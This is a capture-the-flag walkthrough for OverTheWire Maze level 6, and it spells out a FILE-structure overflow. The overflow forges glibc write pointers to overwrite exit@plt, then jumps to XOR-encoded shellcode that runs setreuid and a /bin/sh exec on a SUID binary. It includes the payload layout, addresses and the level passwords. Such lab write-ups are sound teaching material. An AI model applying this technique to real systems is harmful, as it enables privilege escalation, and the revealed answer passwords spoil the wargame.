# Maze Level 6 → 7

## Goal
Overflow into a libc `_IO_FILE` structure and forge its write pointers so the next `fwrite`/`fflush` clobbers `exit@plt` with a pointer to our shellcode. When `main` returns and calls `exit`, control flow lands in our XOR-decoded shellcode.

## Concepts you'll learn
- The internal layout of glibc's `_IO_FILE` / `FILE` struct and why `_IO_write_base/ptr/end` matter.
- What the **PLT** (Procedure Linkage Table) is and why overwriting `exit@plt` redirects `exit()`.
- XOR-encoding shellcode to dodge input filters (the key here is `0x2A`).
- Working with specific addresses on **32-bit x86** — all values below are snapshots from one run; re-derive yours with `gdb`.

## How to log in

```
$ ssh maze6@maze.labs.overthewire.org -p 2225
```

Password is `dOM2C7ZKlG` (from level 5 — treat as snapshot; re-solve if it fails).

## Walkthrough

### 1. Locate the FILE struct on the stack
Find the overflow source and the FILE struct it spills into. On the solver's run the forged FILE sat at `0xffffd158`. Addresses in this level are all shell-environment-sensitive; under `gdb`:

```
$ gdb /maze/maze6
(gdb) break *<addr after fread>
(gdb) run
(gdb) x/40wx <stack addr>
```

### 2. Collect the fixed pieces
From the binary itself (these are stable across runs because they are in the binary, not the stack):

```
exit@plt = 0x0804b208
```

These are snapshot-ish but stable between runs on the same binary; confirm with:

```
$ objdump -d /maze/maze6 | grep '<exit@plt>'
```

### 3. Understand the trick
`fwrite` into a FILE stream uses `_IO_write_base` as the source, `_IO_write_ptr`/`_IO_write_end` as bookkeeping. If you set:

- `_flags` = `0xfbad3484` (a valid magic so libc accepts the struct)
- `_IO_write_base` = `exit@plt - 7` (because the binary prefixes the write with the 7-byte string `"file : "`, so the effective write lands exactly on `exit@plt`)
- `_IO_write_ptr` = somewhere past it, so libc thinks there's unflushed data
- `_IO_write_end` = even further past

…then the next flush copies attacker-controlled bytes over `exit@plt`. Those bytes are the address of your shellcode.

### 4. Place shellcode
Shellcode lives in the same overflow, at `0xffffd204` on the solver's run. It is XOR-encoded with key `0x2A` to survive the input filter; the first few bytes are a tiny self-decoder loop that XORs the payload back in place before jumping.

The syscall chain the decoded shellcode performs is:

```
geteuid -> setreuid(euid, euid) -> execve("/bin/sh", 0, 0) -> exit
```

The `setreuid` step is what promotes us from `maze6` to `maze7`, since the binary is SUID.

### 5. Fire the payload
Build the payload with your preferred scripting language. Layout (approximate):

```
[ filler up to FILE struct at 0xffffd158 ]
[ _flags = 0xfbad3484 ]
[ _IO_read_ptr/base/end/... padding ]
[ _IO_write_base = 0x0804b208 - 7 = 0x0804b201 ]
[ _IO_write_ptr  = _IO_write_base + <len of "file : " + 4> ]
[ _IO_write_end  = _IO_write_ptr + <slack> ]
[ overwrite-value bytes = 0xffffd204  (address of shellcode) ]
[ XOR-encoded shellcode at 0xffffd204 ]
```

Run it against the binary:

```
$ /maze/maze6 < /tmp/payload
```

Expected output:

```
$
```

Grab the next password:

```
$ cat /etc/maze_pass/maze7
B6XkM3Syq6
```

If any of the addresses above don't match on your session, break inside the binary with `gdb` and re-read them — especially `_IO_write_base` (which depends on `exit@plt`) and the stack-side addresses (`0xffffd158`, `0xffffd204`).

### 6. Log in as maze7

```
$ ssh maze7@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze7` is:

**`B6XkM3Syq6`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze6.html>
